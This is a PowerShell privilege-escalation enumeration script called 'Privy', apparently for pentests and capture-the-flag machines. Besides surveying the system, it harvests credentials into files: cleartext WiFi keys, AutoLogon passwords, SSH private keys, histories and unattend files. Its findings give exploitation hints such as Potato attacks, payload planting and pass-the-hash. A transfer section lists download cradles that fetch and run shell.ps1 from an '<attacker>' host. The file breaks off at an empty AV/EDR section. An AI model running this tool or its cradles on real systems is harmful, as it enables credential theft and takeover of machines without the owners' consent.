# ============================================================================
#  ######  ######  #### #     # #     #
#  #     # #     #  #   #     #  #   #
#  #     # #     #  #   #     #   # #
#  ######  ######   #   #     #    #
#  #       #   #    #    #   #     #
#  #       #    #   #     # #      #
#  #       #     # ####    #       #
# ============================================================================
#  Windows Privilege Escalation Enumeration Tool
#  Author : Pentest-Ready
#  Version: 1.1
#  Usage  : powershell -ep bypass -File privy.ps1
# ============================================================================

$ErrorActionPreference = "SilentlyContinue"

# --------------------------------------------------
#  Output directory structure
# --------------------------------------------------
$main     = "Privy"
$sys      = "$main\SysInfo.txt"
$ugo      = "$main\UserGroupInfo.txt"
$svc      = "$main\Services.txt"
$tasks    = "$main\ScheduledTasks.txt"
$reg      = "$main\Registry.txt"
$netstuff = "$main\NetworkInfo.txt"
$creds    = "$main\Credentials.txt"
$sw_out   = "$main\Software.txt"
$fs       = "$main\FileSystem.txt"
$history  = "$main\Histories.txt"
$devtools = "$main\DevTools.txt"
$findings = "$main\00-FINDINGS.txt"
$exploit  = "$main\01-ExploitPaths.txt"

# --------------------------------------------------
#  Helper functions
# --------------------------------------------------
function Banner {
    Write-Host "`n  ============================================================================" -ForegroundColor Cyan
    Write-Host "   ######  ######  #### #     # #     #" -ForegroundColor Cyan
    Write-Host "   #     # #     #  #   #     #  #   #" -ForegroundColor Cyan
    Write-Host "   #     # #     #  #   #     #   # #" -ForegroundColor Cyan
    Write-Host "   ######  ######   #   #     #    #" -ForegroundColor Cyan
    Write-Host "   #       #   #    #    #   #     #" -ForegroundColor Cyan
    Write-Host "   #       #    #   #     # #      #" -ForegroundColor Cyan
    Write-Host "   #       #     # ####    #       #" -ForegroundColor Cyan
    Write-Host "  ============================================================================" -ForegroundColor Cyan
    Write-Host "   Windows Privilege Escalation Enumeration Tool v1.1" -ForegroundColor Yellow
    Write-Host "  ============================================================================`n" -ForegroundColor Cyan
}

function Section-Header {
    param($Label, $OutFile)
    Write-Host "[+] $Label" -ForegroundColor Green
    Add-Content $OutFile "`n======================================================================"
    Add-Content $OutFile "[+] $Label"
    Add-Content $OutFile "======================================================================`n"
}

function Sub-Header {
    param($Label, $OutFile)
    Write-Host "    > $Label" -ForegroundColor Yellow
    Add-Content $OutFile "----------------------------------------------------------------------"
    Add-Content $OutFile "  > $Label"
    Add-Content $OutFile "----------------------------------------------------------------------"
}

function Run-Cmd {
    param($Label, [ScriptBlock]$Cmd, $OutFile)
    Write-Host "    $Label" -ForegroundColor Cyan
    Add-Content $OutFile "  [$Label]"
    $cmdText = ($Cmd.ToString().Trim() -replace '\s+', ' ')
    Add-Content $OutFile "  > $cmdText"
    Add-Content $OutFile "--------"
    try {
        $result = & $Cmd 2>$null | Out-String
        Add-Content $OutFile $result
    } catch {
        Add-Content $OutFile "  (error or not available)"
    }
    Add-Content $OutFile ""
}

function Finding {
    param($Msg, $OutFile)
    Write-Host "    [!!] $Msg" -ForegroundColor Red
    Add-Content $OutFile "`n  [!!] FINDING: $Msg`n"
    Add-Content $findings "[!!] $Msg  (see $([System.IO.Path]::GetFileName($OutFile)))"
}

function Exploit-Entry {
    param($Priority, $Vector, $Steps)
    switch ($Priority) {
        "P1" { Write-Host "    [P1] $Vector" -ForegroundColor Red }
        "P2" { Write-Host "    [P2] $Vector" -ForegroundColor Yellow }
        "P3" { Write-Host "    [P3] $Vector" -ForegroundColor Cyan }
    }
    Add-Content $exploit "----------------------------------------------------------------------"
    Add-Content $exploit "[$Priority] $Vector"
    Add-Content $exploit "----------------------------------------------------------------------"
    Add-Content $exploit $Steps
    Add-Content $exploit ""
}

function Separator {
    param($OutFile)
    Add-Content $OutFile "`n======================================================================`n"
}

# --------------------------------------------------
#  Initialise
# --------------------------------------------------
Banner

if (Test-Path $main) {
    $bak = "${main}_bak_$(Get-Date -Format 'yyyyMMddHHmmss')"
    Write-Host "[!] Directory '$main' exists. Backing up to $bak..." -ForegroundColor Yellow
    Rename-Item $main $bak
}

New-Item -ItemType Directory -Path $main | Out-Null

# Init findings
@"
======================================================================
  PRIVY -- FINDINGS SUMMARY
  Generated: $(Get-Date)
  Host: $env:COMPUTERNAME
  User: $env:USERNAME
======================================================================

"@ | Out-File $findings -Encoding UTF8

Write-Host "[+] Output directory: $(Get-Location)\$main" -ForegroundColor Green
Write-Host "[+] Scan started: $(Get-Date)`n" -ForegroundColor Green

$startTime = Get-Date

# ============================================================================
#  1. SYSTEM INFORMATION
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 1 : SYSTEM INFORMATION" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"[+] System Info`n$(Get-Date)`n" | Out-File $sys -Encoding UTF8

Section-Header "System Information" $sys

Sub-Header "OS & Kernel" $sys
Run-Cmd "systeminfo" { systeminfo } $sys
Run-Cmd "OS Version" { (Get-WmiObject Win32_OperatingSystem).Caption + " Build " + (Get-WmiObject Win32_OperatingSystem).BuildNumber } $sys
Run-Cmd "Architecture" { (Get-WmiObject Win32_OperatingSystem).OSArchitecture } $sys

Sub-Header "Hostname & Domain" $sys
Run-Cmd "hostname" { hostname } $sys
Run-Cmd "Domain" { (Get-WmiObject Win32_ComputerSystem).Domain } $sys
Run-Cmd "ipconfig" { ipconfig /all } $sys

Sub-Header "Environment Variables" $sys
Run-Cmd "env" { Get-ChildItem Env: | Format-Table -AutoSize } $sys

Sub-Header "Hotfixes / Patches" $sys
Run-Cmd "Installed Hotfixes" { Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 30 | Format-Table -AutoSize } $sys

Separator $sys
Write-Host "    [v] Saved -> $sys`n" -ForegroundColor Green

# ============================================================================
#  2. USER & GROUP INFORMATION
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 2 : USER & GROUP INFORMATION" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $ugo -Encoding UTF8
Section-Header "User & Group Information" $ugo

Sub-Header "Current User Context" $ugo
Run-Cmd "whoami" { whoami } $ugo
Run-Cmd "whoami /all" { whoami /all } $ugo

# Capture privileges for later
$whoamiPriv = whoami /priv 2>$null | Out-String

Sub-Header "Privilege Analysis" $ugo
Run-Cmd "whoami /priv" { whoami /priv } $ugo

$dangerousPrivs = @{
    "SeImpersonatePrivilege"  = "Potato exploit (PrintSpoofer / GodPotato / JuicyPotato) -> SYSTEM"
    "SeAssignPrimaryToken"    = "Potato exploit -> SYSTEM"
    "SeBackupPrivilege"       = "Copy SAM/SYSTEM hives -> dump hashes -> crack or PTH"
    "SeRestorePrivilege"      = "Overwrite system files / DLL hijack"
    "SeTakeOwnershipPrivilege"= "Take ownership of sensitive files (SAM, SYSTEM, service binaries)"
    "SeDebugPrivilege"        = "Inject into LSASS or SYSTEM processes -> dump creds / code exec"
    "SeLoadDriverPrivilege"   = "Load a malicious driver -> kernel-level code execution"
    "SeCreateTokenPrivilege"  = "Create tokens with arbitrary privileges -> SYSTEM"
    "SeTcbPrivilege"          = "Act as OS - create tokens, log on as any user"
    "SeManageVolumePrivilege" = "Write to arbitrary disk sectors -> overwrite files"
}

foreach ($priv in $dangerousPrivs.Keys) {
    if ($whoamiPriv -match $priv) {
        if ($whoamiPriv -match "$priv\s+\S+\s+Enabled") {
            Finding "$priv is ENABLED -- $($dangerousPrivs[$priv])" $ugo
        } else {
            Finding "$priv present (disabled) -- may be enableable: $($dangerousPrivs[$priv])" $ugo
        }
    }
}

Sub-Header "Local Users" $ugo
Run-Cmd "net user" { net user } $ugo
Run-Cmd "Local user details" { Get-LocalUser | Format-Table Name,Enabled,LastLogon,PasswordRequired -AutoSize } $ugo

Sub-Header "Local Groups" $ugo
Run-Cmd "net localgroup" { net localgroup } $ugo
Run-Cmd "Administrators group" { net localgroup Administrators } $ugo

Sub-Header "Logged-On Users" $ugo
Run-Cmd "query user" { query user } $ugo

Sub-Header "Password Policy" $ugo
Run-Cmd "net accounts" { net accounts } $ugo

Sub-Header "Saved Credentials" $ugo
Run-Cmd "cmdkey /list" { cmdkey /list } $ugo
$cmdkeyResult = cmdkey /list 2>$null | Out-String
if ($cmdkeyResult -match "Target:") {
    Finding "Saved credentials found in cmdkey -- try: runas /savecred /user:<user> cmd" $ugo
}

Separator $ugo
Write-Host "    [v] Saved -> $ugo`n" -ForegroundColor Green

# ============================================================================
#  3. SERVICES
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 3 : SERVICES" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $svc -Encoding UTF8
Section-Header "Services" $svc

Sub-Header "All Running Services" $svc
Run-Cmd "Get-Service (running)" { Get-Service | Where-Object { $_.Status -eq 'Running' } | Format-Table -AutoSize } $svc

Sub-Header "Unquoted Service Paths" $svc
Write-Host "    Checking unquoted service paths..." -ForegroundColor Cyan
$unquoted = @()
Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch '^C:\\Windows' } | ForEach-Object {
    $unquoted += $_.Name + " -> " + $_.PathName
    Add-Content $svc "  [UNQUOTED] $($_.Name) -> $($_.PathName)"
}
if ($unquoted.Count -gt 0) {
    Finding "Unquoted service path(s) found ($($unquoted.Count)) -- plant payload in intermediate path for SYSTEM on restart" $svc
}

Sub-Header "Writable Service Binaries" $svc
Write-Host "    Checking service binary permissions..." -ForegroundColor Cyan
Get-WmiObject Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
    $binPath = ($_.PathName -replace '"','').Split(' ')[0]
    if (Test-Path $binPath) {
        $acl = Get-Acl $binPath -ErrorAction SilentlyContinue
        if ($acl) {
            $acl.Access | Where-Object {
                $_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users" -and
                $_.FileSystemRights -match "Write|FullControl|Modify"
            } | ForEach-Object {
                Add-Content $svc "  [WRITABLE BINARY] $binPath ($($_.IdentityReference) - $($_.FileSystemRights))"
                Finding "Writable service binary: $binPath -- replace with payload for SYSTEM on restart" $svc
            }
        }
    }
}

Sub-Header "Modifiable Services (sc sdshow)" $svc
Run-Cmd "accesschk (if available)" { accesschk.exe /accepteula -uwcqv "Everyone" * 2>$null } $svc
Run-Cmd "accesschk Users" { accesschk.exe /accepteula -uwcqv "Users" * 2>$null } $svc

Separator $svc
Write-Host "    [v] Saved -> $svc`n" -ForegroundColor Green

# ============================================================================
#  4. SCHEDULED TASKS
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 4 : SCHEDULED TASKS" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $tasks -Encoding UTF8
Section-Header "Scheduled Tasks" $tasks

Sub-Header "All Scheduled Tasks" $tasks
Run-Cmd "schtasks /query" { schtasks /query /fo LIST /v } $tasks

Sub-Header "Tasks Running as SYSTEM with Writable Scripts" $tasks
Write-Host "    Checking scheduled task scripts for writability..." -ForegroundColor Cyan
schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv | Where-Object {
    $_.'Run As User' -match 'SYSTEM|Administrator' -and $_.'Task To Run' -notmatch 'COM handler'
} | ForEach-Object {
    $taskExe = $_.'Task To Run'
    if ($taskExe -and (Test-Path $taskExe)) {
        $acl = Get-Acl $taskExe -ErrorAction SilentlyContinue
        if ($acl) {
            $acl.Access | Where-Object {
                $_.IdentityReference -match "Everyone|Users|Authenticated Users|BUILTIN\\Users" -and
                $_.FileSystemRights -match "Write|FullControl|Modify"
            } | ForEach-Object {
                Add-Content $tasks "  [WRITABLE TASK SCRIPT] $taskExe"
                Finding "Writable scheduled task script running as SYSTEM: $taskExe" $tasks
            }
        }
    }
}

Separator $tasks
Write-Host "    [v] Saved -> $tasks`n" -ForegroundColor Green

# ============================================================================
#  5. REGISTRY CHECKS
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 5 : REGISTRY" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $reg -Encoding UTF8
Section-Header "Registry Checks" $reg

Sub-Header "AlwaysInstallElevated" $reg
$aieHKLM = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aieHKCU = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
Add-Content $reg "  HKLM AlwaysInstallElevated: $aieHKLM"
Add-Content $reg "  HKCU AlwaysInstallElevated: $aieHKCU"
if ($aieHKLM -eq 1 -and $aieHKCU -eq 1) {
    Finding "AlwaysInstallElevated is set in both HKLM and HKCU -- MSI payload runs as SYSTEM!" $reg
}

Sub-Header "AutoLogon Credentials" $reg
$winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
Run-Cmd "Winlogon" { Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon | Format-List } $reg
if ($winlogon.DefaultPassword) {
    Finding "AutoLogon password found in registry: DefaultPassword = $($winlogon.DefaultPassword)" $reg
}

Sub-Header "Stored Passwords in Registry" $reg
Run-Cmd "SNMP community strings" { Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" -ErrorAction SilentlyContinue } $reg
Run-Cmd "PuTTY saved sessions" { Get-ChildItem "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction SilentlyContinue | ForEach-Object { Get-ItemProperty $_.PSPath } } $reg

$puttyPass = Get-ChildItem "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction SilentlyContinue
if ($puttyPass) {
    Finding "PuTTY saved sessions found -- may contain credentials" $reg
}

Sub-Header "LSA Cached Credentials" $reg
Run-Cmd "CachedLogonsCount" { (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").CachedLogonsCount } $reg

Sub-Header "UAC Configuration" $reg
Run-Cmd "UAC Level" { Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" | Select-Object EnableLUA, ConsentPromptBehaviorAdmin, LocalAccountTokenFilterPolicy | Format-List } $reg
$uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue
if ($uac.LocalAccountTokenFilterPolicy -eq 1) {
    Finding "LocalAccountTokenFilterPolicy=1 -- remote admin over SMB/WinRM has full token (PTH friendly)" $reg
}

Separator $reg
Write-Host "    [v] Saved -> $reg`n" -ForegroundColor Green

# ============================================================================
#  6. NETWORK INFORMATION
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 6 : NETWORK INFORMATION" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $netstuff -Encoding UTF8
Section-Header "Network Information" $netstuff

Sub-Header "Interfaces" $netstuff
Run-Cmd "ipconfig /all" { ipconfig /all } $netstuff

Sub-Header "Routing Table" $netstuff
Run-Cmd "route print" { route print } $netstuff

Sub-Header "Active Connections" $netstuff
Run-Cmd "netstat -ano" { netstat -ano } $netstuff

Sub-Header "ARP Cache" $netstuff
Run-Cmd "arp -a" { arp -a } $netstuff

Sub-Header "DNS Cache" $netstuff
Run-Cmd "ipconfig /displaydns" { ipconfig /displaydns } $netstuff

Sub-Header "Hosts File" $netstuff
Run-Cmd "hosts" { Get-Content C:\Windows\System32\drivers\etc\hosts } $netstuff

Sub-Header "Firewall Rules" $netstuff
Run-Cmd "netsh advfirewall show allprofiles" { netsh advfirewall show allprofiles } $netstuff
Run-Cmd "Inbound allow rules" { netsh advfirewall firewall show rule name=all dir=in action=allow | Select-String "Rule Name|LocalPort|RemoteIP" | Select-Object -First 40 } $netstuff

Sub-Header "WiFi Saved Profiles" $netstuff
Run-Cmd "netsh wlan show profiles" { netsh wlan show profiles } $netstuff
$wifiProfiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
foreach ($profile in $wifiProfiles) {
    $key = netsh wlan show profile name=$profile key=clear 2>$null | Select-String "Key Content"
    if ($key) {
        Add-Content $netstuff "  [WIFI CRED] Profile: $profile -> $key"
        Finding "WiFi password recovered for profile: $profile" $netstuff
    }
}

Sub-Header "Shares" $netstuff
Run-Cmd "net share" { net share } $netstuff

Separator $netstuff
Write-Host "    [v] Saved -> $netstuff`n" -ForegroundColor Green

# ============================================================================
#  7. CREDENTIAL HUNTING
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 7 : CREDENTIAL HUNTING" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $creds -Encoding UTF8
Section-Header "Credential Hunting" $creds

Sub-Header "Unattend / Sysprep Files" $creds
$unattendPaths = @(
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattended.xml",
    "C:\Windows\system32\sysprep\unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\unattend.xml",
    "C:\sysprep.inf",
    "C:\sysprep\sysprep.xml"
)
foreach ($path in $unattendPaths) {
    if (Test-Path $path) {
        Run-Cmd "$path" { Get-Content $path } $creds
        Finding "Unattend/Sysprep file found: $path -- may contain plaintext credentials!" $creds
    }
}

Sub-Header "PowerShell History" $creds
$psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $psHistory) {
    Run-Cmd "PSReadLine history" { Get-Content $psHistory } $creds
    Finding "PowerShell history readable: $psHistory" $creds
}

Sub-Header "IIS Web Configs" $creds
$webConfigs = @(
    "C:\inetpub\wwwroot\web.config",
    "C:\inetpub\wwwroot\Web.config",
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config"
)
foreach ($wc in $webConfigs) {
    if (Test-Path $wc) {
        Run-Cmd "$wc" { Get-Content $wc } $creds
        $wcContent = Get-Content $wc -Raw -ErrorAction SilentlyContinue
        if ($wcContent -match "password|connectionString|pwd") {
            Finding "Potential credentials in $wc" $creds
        }
    }
}
Run-Cmd "Find web.config files" { Get-ChildItem C:\ -Recurse -Include "web.config" -ErrorAction SilentlyContinue | Select-Object -First 10 FullName } $creds

Sub-Header "Common Credential Files" $creds
$credFiles = @(
    "$env:USERPROFILE\.ssh\id_rsa",
    "$env:USERPROFILE\.ssh\id_dsa",
    "$env:USERPROFILE\.ssh\authorized_keys",
    "$env:USERPROFILE\.gitconfig",
    "$env:USERPROFILE\AppData\Roaming\filezilla\recentservers.xml",
    "$env:USERPROFILE\AppData\Roaming\filezilla\sitemanager.xml",
    "C:\Program Files\FileZilla Server\FileZilla Server.xml",
    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
)
foreach ($cf in $credFiles) {
    if (Test-Path $cf) {
        Run-Cmd "$cf" { Get-Content $cf -ErrorAction SilentlyContinue } $creds
        Finding "Credential file found: $cf" $creds
    }
}

Sub-Header "SSH Keys (all users)" $creds
$sshKeyNames = @("id_rsa","id_dsa","id_ecdsa","id_ed25519","authorized_keys","known_hosts")
Get-ChildItem "C:\Users" -ErrorAction SilentlyContinue | ForEach-Object {
    $sshDir = "$($_.FullName)\.ssh"
    if (Test-Path $sshDir) {
        Run-Cmd "ls $sshDir" { Get-ChildItem $sshDir -Force -ErrorAction SilentlyContinue | Format-Table -AutoSize } $creds
        foreach ($n in $sshKeyNames) {
            $kf = Join-Path $sshDir $n
            if (Test-Path $kf) {
                try {
                    $kc = Get-Content $kf -ErrorAction Stop
                    Run-Cmd "$kf" { Get-Content $kf } $creds
                    if ($n -match "^id_") {
                        Finding "Readable SSH PRIVATE key: $kf" $creds
                    } else {
                        Finding "Readable SSH file: $kf" $creds
                    }
                } catch {}
            }
        }
    }
}
Run-Cmd "find id_rsa anywhere" { Get-ChildItem C:\ -Recurse -Include "id_rsa","id_ed25519","id_ecdsa" -ErrorAction SilentlyContinue | Select-Object -First 10 FullName } $creds

Sub-Header "Browser Credentials" $creds
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles"
)
foreach ($bp in $browserPaths) {
    if (Test-Path $bp) {
        Add-Content $creds "  [BROWSER DATA] $bp"
        Finding "Browser credential store present: $bp -- exfil and decrypt with DPAPI/SharpChrome" $creds
    }
}

Sub-Header "Password Search in Common Locations" $creds
Run-Cmd "findstr password in C:\Users" {
    Get-ChildItem "$env:USERPROFILE" -Recurse -Include "*.txt","*.ini","*.cfg","*.config","*.xml","*.ps1","*.bat","*.cmd" -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|pwd" -CaseSensitive:$false -ErrorAction SilentlyContinue |
    Select-Object -First 20 | Format-Table Path,LineNumber,Line -AutoSize
} $creds

Run-Cmd "findstr password in C:\xampp" {
    Get-ChildItem "C:\xampp" -Recurse -Include "*.php","*.ini","*.conf","*.config" -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|pwd" -CaseSensitive:$false -ErrorAction SilentlyContinue |
    Select-Object -First 20 | Format-Table Path,LineNumber,Line -AutoSize
} $creds

Sub-Header "SAM / SYSTEM Hives" $creds
Run-Cmd "Check SAM accessibility" {
    $items = @("C:\Windows\System32\config\SAM","C:\Windows\System32\config\SYSTEM","C:\Windows\System32\config\SECURITY")
    foreach ($i in $items) { if (Test-Path $i) { "EXISTS: $i" } }
} $creds

Sub-Header "DPAPI Master Keys" $creds
Run-Cmd "DPAPI masterkeys" { Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -ErrorAction SilentlyContinue } $creds

Separator $creds
Write-Host "    [v] Saved -> $creds`n" -ForegroundColor Green

# ============================================================================
#  8. INSTALLED SOFTWARE
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 8 : INSTALLED SOFTWARE" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $sw_out -Encoding UTF8
Section-Header "Installed Software" $sw_out

Sub-Header "Installed Programs (32 & 64-bit)" $sw_out
Run-Cmd "64-bit programs" { Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -AutoSize } $sw_out
Run-Cmd "32-bit programs" { Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -AutoSize } $sw_out

Sub-Header "Program Files Contents" $sw_out
Run-Cmd "C:\Program Files" { Get-ChildItem "C:\Program Files" -ErrorAction SilentlyContinue | Format-Table Name,LastWriteTime -AutoSize } $sw_out
Run-Cmd "C:\Program Files (x86)" { Get-ChildItem "C:\Program Files (x86)" -ErrorAction SilentlyContinue | Format-Table Name,LastWriteTime -AutoSize } $sw_out

Sub-Header "Interesting Installed Software" $sw_out
$interestingSW = @("xampp","wamp","mamp","mysql","postgresql","tomcat","jenkins","apache","nginx","iis","putty","winscp","vnc","teamviewer","notepad++","python","ruby","perl","git","node","golang","java")
$installedNames = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue).DisplayName
foreach ($sw in $interestingSW) {
    $match = $installedNames | Where-Object { $_ -match $sw }
    if ($match) {
        Add-Content $sw_out "  [INTERESTING] $match"
    }
}

Separator $sw_out
Write-Host "    [v] Saved -> $sw_out`n" -ForegroundColor Green

# ============================================================================
#  9. FILE SYSTEM
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 9 : FILE SYSTEM" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $fs -Encoding UTF8
Section-Header "File System" $fs

Sub-Header "Drives" $fs
Run-Cmd "Get-PSDrive" { Get-PSDrive -PSProvider FileSystem | Format-Table -AutoSize } $fs

Sub-Header "Writable Directories in System Paths" $fs
Write-Host "    Checking common dirs for writability..." -ForegroundColor Cyan
$systemPaths = @("C:\Windows\System32","C:\Windows\SysWOW64","C:\Windows\Temp","C:\Temp","C:\Windows","C:\")
foreach ($sp in $systemPaths) {
    if (Test-Path $sp) {
        $testFile = "$sp\privy_test_$(Get-Random).tmp"
        try {
            [System.IO.File]::WriteAllText($testFile, "test")
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
            Add-Content $fs "  [WRITABLE] $sp"
            Finding "Writable system path: $sp" $fs
        } catch {}
    }
}

Sub-Header "Recently Modified Files" $fs
Run-Cmd "Modified in last 10 min" {
    Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-10) -and -not $_.PSIsContainer } |
    Select-Object -First 20 FullName,LastWriteTime | Format-Table -AutoSize
} $fs

Sub-Header "Interesting Files" $fs
Run-Cmd "Backup/config files" {
    Get-ChildItem C:\ -Recurse -Include "*.bak","*.old","*.orig","*.save","*.backup" -ErrorAction SilentlyContinue |
    Select-Object -First 20 FullName | Format-Table -AutoSize
} $fs

Sub-Header "Desktop & Documents" $fs
Run-Cmd "User Desktop" { Get-ChildItem "$env:USERPROFILE\Desktop" -Force -ErrorAction SilentlyContinue | Format-Table -AutoSize } $fs
Run-Cmd "User Documents" { Get-ChildItem "$env:USERPROFILE\Documents" -Force -ErrorAction SilentlyContinue | Format-Table -AutoSize } $fs
Run-Cmd "Public Desktop" { Get-ChildItem "C:\Users\Public\Desktop" -Force -ErrorAction SilentlyContinue | Format-Table -AutoSize } $fs

Sub-Header "Flag Locations (CTF)" $fs
Run-Cmd "Search for flags" {
    $flagPaths = @(
        "C:\Users\Administrator\Desktop\root.txt",
        "C:\Users\Administrator\Desktop\flag.txt",
        "C:\Users\$env:USERNAME\Desktop\user.txt",
        "C:\Users\$env:USERNAME\Desktop\flag.txt",
        "C:\Users\Public\Desktop\root.txt",
        "C:\root.txt","C:\flag.txt"
    )
    foreach ($fp in $flagPaths) { if (Test-Path $fp) { "FOUND: $fp"; Get-Content $fp } }
} $fs

Separator $fs
Write-Host "    [v] Saved -> $fs`n" -ForegroundColor Green

# ============================================================================
#  10. HISTORIES
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 10: HISTORIES" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $history -Encoding UTF8
Section-Header "Histories" $history

Sub-Header "PowerShell History (all users)" $history
Get-ChildItem "C:\Users" -ErrorAction SilentlyContinue | ForEach-Object {
    $hist = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $hist) {
        Run-Cmd "PSReadLine: $($_.Name)" { Get-Content $hist } $history
        Finding "PowerShell history found for user: $($_.Name)" $history
    }
}

Sub-Header "cmd.exe History (doskey)" $history
Run-Cmd "doskey /history" { doskey /history } $history

Sub-Header "Recent Files" $history
Run-Cmd "Recent" { Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue | Format-Table Name,LastWriteTime -AutoSize | Select-Object -First 30 } $history

Separator $history
Write-Host "    [v] Saved -> $history`n" -ForegroundColor Green

# ============================================================================
#  11. DEV TOOLS & TRANSFER VECTORS
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 11: DEV TOOLS & TRANSFER VECTORS" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

"" | Out-File $devtools -Encoding UTF8
Section-Header "Dev Tools & Transfer Vectors" $devtools

Sub-Header "Languages & Runtimes" $devtools
$tools = @("python","python3","ruby","perl","node","java","php","go","gcc","powershell","pwsh")
foreach ($t in $tools) {
    $loc = Get-Command $t -ErrorAction SilentlyContinue
    if ($loc) {
        Add-Content $devtools "  [FOUND] $t -> $($loc.Source)"
        Write-Host "    [+] $t -> $($loc.Source)" -ForegroundColor Green
    }
}

Sub-Header "File Transfer Tools" $devtools
$xferTools = @("curl","wget","certutil","bitsadmin","ftp","tftp","nc","ncat","scp","wget")
foreach ($t in $xferTools) {
    $loc = Get-Command $t -ErrorAction SilentlyContinue
    if ($loc) {
        Add-Content $devtools "  [FOUND] $t -> $($loc.Source)"
        Write-Host "    [+] $t -> $($loc.Source)" -ForegroundColor Green
    }
}

Sub-Header "PowerShell Download Cradles Available" $devtools
Add-Content $devtools @"

  Transfer from attacker:
  IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/shell.ps1')
  Invoke-WebRequest -Uri 'http://<attacker>/file.exe' -OutFile 'C:\Temp\file.exe'
  certutil -urlcache -split -f 'http://<attacker>/file.exe' file.exe
  bitsadmin /transfer job /download /priority normal http://<attacker>/file.exe C:\Temp\file.exe
"@

Sub-Header "AV / EDR Detection" $devtools
